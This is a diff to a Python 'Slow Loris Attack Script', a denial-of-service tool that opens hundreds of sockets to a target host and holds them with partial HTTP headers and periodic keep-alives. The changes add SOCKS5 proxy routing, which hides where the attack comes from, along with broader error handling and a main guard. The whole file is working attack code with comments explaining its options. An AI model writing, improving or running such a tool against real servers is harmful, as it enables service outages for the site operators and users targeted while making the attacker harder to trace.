@@ -8,16 +8,25 @@ from time import sleep
 #arg parse stuff
 argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")
 
-argparser.add_argument("domain", nargs="?", type=str, help="Host")
+argparser.add_argument("domain", nargs="?", type=str, help="Host to test")
 
 #default for http is 80
 argparser.add_argument("-p", "--port", type=int, default=8080, help="Port")
 
+#time to keep connection alive, default is 4 seconds
 argparser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")
 
+#sleep time, default is 1 second
 argparser.add_argument("-t", "--sleeptime", type=int, default=1, help="Time to sleep")
 
+#number of sockets, default is 200
 argparser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")
+
+#socks5 proxy
+argparser.add_argument("-5", "--socks5", nargs="?", type=str, help="Socks5 proxy")
+
+#socks5 port
+argparser.add_argument("-5p", "--socks5port", type=int, default=1080, help="Socks5 port")
 
 parser = argparser.parse_args()
 
@@ -25,6 +34,7 @@ parser = argparser.parse_args()
 if len(sys.argv) <= 1:
     argparser.print_help()
     sys.exit(1)
+
 
 #if no domain then poop pants
 if not parser.domain:
@@ -90,7 +100,20 @@ class slsock(object):
     #init and send for each socket
     def __init__(self, domain):
         try:
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            #place holder to get around scope
+            self.sock = 0
+
+            #if there is a socks proxy
+            if parser.socks5:
+                import socks
+                self.sock = socks.socksocket(socks.AF_INET, socks.SOCK_STREAM)
+                #setting proxy type socks5, proxy address, proxy port
+                self.sock.set_proxy(socks.SOCKS5, parser.socks5, parser.socks5port)
+
+            #if there is no proxy, just use normal socket
+            else:
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
             #set the time out time default 5
             self.sock.settimeout(parser.alivetime)
@@ -107,7 +130,8 @@ class slsock(object):
 
             #accepted langs line
             self.sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("UTF-8"))
-        except socket.error as e:
+        #this will catch normal socket errors, general proxy issues, authentication issues, and problems with the proxy
+        except (socket.error, socks.GeneralProxyError, socks.SOCKS5AuthError, socks.SOCKS5Error) as e:
             print("Init Error: ", e)
 
     #sending the keep alives
@@ -121,6 +145,6 @@ class slsock(object):
 
 
 
-main()
-
+if __name__ == "__main__":
+    main()
 
